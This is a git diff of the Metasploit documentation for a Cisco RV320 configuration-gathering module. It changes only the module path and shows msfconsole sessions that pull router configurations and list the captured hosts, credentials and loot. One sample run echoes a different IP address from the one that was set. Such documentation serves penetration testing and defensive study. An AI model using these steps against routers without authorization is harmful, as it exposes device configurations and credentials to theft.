@@ -10,7 +10,7 @@ More context is available from [Rapid7's blog post](https://blog.rapid7.com/2019
 ## Verification Steps
 
  1. Start `msfconsole`
- 2. `use auxiliary/gather/cisco/cisco_rv320_config`
+ 2. `use auxiliary/gather/cisco_rv320_config`
  3. `set RHOSTS 192.168.1.1` (default LAN IP) or to the WAN interface
  4. `run`
  6. Review the downloaded configuration file cited in the output.  For example:
@@ -31,10 +31,10 @@ More context is available from [Rapid7's blog post](https://blog.rapid7.com/2019
 
 ```
 msf5 >
-msf5 > use auxiliary/gather/cisco/cisco_rv320_config
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > set RHOSTS 192.168.1.1
+msf5 > use auxiliary/gather/cisco_rv320_config
+msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
 RHOSTS => 192.168.1.1
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
+msf5 auxiliary(gather/cisco_rv320_config) > run
 
 [+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -45,14 +45,14 @@ msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
 
 ```
 msf5 >
-msf5 > use auxiliary/gather/cisco/cisco_rv320_config
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > set RHOSTS 172.16.0.34
+msf5 > use auxiliary/gather/cisco_rv320_config
+msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 172.16.0.34
 RHOSTS => 192.168.1.1
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > set RPORT 8007
+msf5 auxiliary(gather/cisco_rv320_config) > set RPORT 8007
 RPORT => 8007
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > set SSL false
+msf5 auxiliary(gather/cisco_rv320_config) > set SSL false
 SSL => false
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
+msf5 auxiliary(gather/cisco_rv320_config) > run
 
 [+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -63,10 +63,10 @@ msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
 
 ```
 msf5 >
-msf5 > use auxiliary/gather/cisco/cisco_rv320_config
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > set RHOSTS 192.168.1.1
+msf5 > use auxiliary/gather/cisco_rv320_config
+msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
 RHOSTS => 192.168.1.1
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
+msf5 auxiliary(gather/cisco_rv320_config) > run
 
 [+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -77,10 +77,10 @@ msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
 
 ```
 msf5 >
-msf5 > use auxiliary/gather/cisco/cisco_rv320_config
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > set RHOSTS 192.168.1.1
+msf5 > use auxiliary/gather/cisco_rv320_config
+msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
 RHOSTS => 192.168.1.1
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
+msf5 auxiliary(gather/cisco_rv320_config) > run
 
 [-] Auxiliary aborted due to failure: not-vulnerable: Response suggests device is patched
 [*] Auxiliary module execution completed
@@ -89,7 +89,7 @@ msf5 auxiliary(gather/cisco/cisco_rv320_config) > run
 #### If module succeeds, check the database:
 
 ```
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > hosts
+msf5 auxiliary(gather/cisco_rv320_config) > hosts
 
 Hosts
 =====
@@ -101,7 +101,7 @@ address      mac                name          os_name  os_flavor  os_sp  purpose
 ```
 
 ```
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > creds
+msf5 auxiliary(gather/cisco_rv320_config) > creds
 Credentials
 ===========
 
@@ -112,7 +112,7 @@ host         origin       service          public  private                      
 ```
 
 ```
-msf5 auxiliary(gather/cisco/cisco_rv320_config) > loot
+msf5 auxiliary(gather/cisco_rv320_config) > loot
 
 Loot
 ====
